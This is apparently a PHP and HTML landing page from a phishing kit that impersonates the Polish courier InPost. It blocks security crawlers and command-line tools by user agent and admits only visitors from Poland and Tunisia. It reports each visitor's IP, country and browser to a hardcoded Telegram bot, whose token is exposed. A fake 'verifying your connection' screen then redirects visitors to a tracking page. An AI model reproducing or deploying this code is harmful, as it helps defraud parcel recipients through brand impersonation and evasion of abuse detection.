<?php
// === CONFIG ===
$botToken = '7166403259:AAHcKMLdIWrWZdlf1jp7Vuubd3Tdczov7Eo';
$chatId = '5995238784';
$allowedCountries = ['PL', 'TN'];

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function isBot() {
    if (empty($_SERVER['HTTP_USER_AGENT'])) {
        return true;
    }

    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
    $botSignatures = [
        'bot', 'crawler', 'spider', 'curl', 'wget', 'python', 'java', 'libwww', 'scrapy', 'httpclient', 'php', 'go-http-client'
    ];

    foreach ($botSignatures as $botSig) {
        if (strpos($ua, $botSig) !== false) {
            return true;
        }
    }

    return false;
}

$ip = getUserIP();

if (isBot()) {
    http_response_code(403);
    exit('Dostęp zabroniony');
}

$geo = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode");
$geoData = json_decode($geo, true);
$countryCode = ($geoData && $geoData['status'] === 'success') ? $geoData['countryCode'] : 'Unknown';

$message = "🌐 Nowa wizyta:\nIP: $ip\nKraj: $countryCode\nUser-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Nieznany') . "\nData: " . date('Y-m-d H:i:s');

$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
];
$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data),
    ],
];
$context = stream_context_create($options);
@file_get_contents($telegramURL, false, $context);

if (!in_array($countryCode, $allowedCountries)) {
    http_response_code(403);
    exit('Dostęp zabroniony');
}
?>

<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>inpost.pl</title>
<style>
  body {
    margin: 0;
    height: 100vh;
    display: flex;
    background: #f9f9f9;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    color: #333;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    text-align: center;
    user-select: none;
  }
  h1 {
    font-weight: 700;
    font-size: 2rem;
    margin-bottom: 1rem;
  }
  p {
    font-weight: 500;
    font-size: 1.125rem;
    max-width: 400px;
    line-height: 1.4;
  }
  .spinner {
    margin: 20px auto 30px auto;
    width: 48px;
    height: 48px;
    border: 5px solid #eee;
    border-top: 5px solid #ffcc00;
    border-radius: 50%;
    animation: spin 1.1s linear infinite;
  }
  @keyframes spin {
    0%   { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  .hidden { display: none; }
</style>
<script>
  document.addEventListener('DOMContentLoaded', () => {
    const spinner = document.getElementById('spinner');
    const message = document.getElementById('message');
    const redirectDelay = 3000;

    // After delay, hide spinner, show message and redirect after short pause
    setTimeout(() => {
      spinner.classList.add('hidden');
      message.textContent = 'Brak problemów, możesz kontynuować.';
      setTimeout(() => {
        window.location.href = 'tracking.html';
      }, 1500);
    }, redirectDelay);
  });
</script>
</head>
<body>
  <h1>inpost.pl</h1>
  <p>Potwierdzamy, że jesteś człowiekiem. To może potrwać kilka sekund.</p>
  <p>inpost.pl musi sprawdzić bezpieczeństwo Twojego połączenia, zanim będziesz mógł kontynuować.</p>
  <div id="spinner" class="spinner" aria-label="Ładowanie..."></div>
  <p id="message"></p>
</body>
</html>
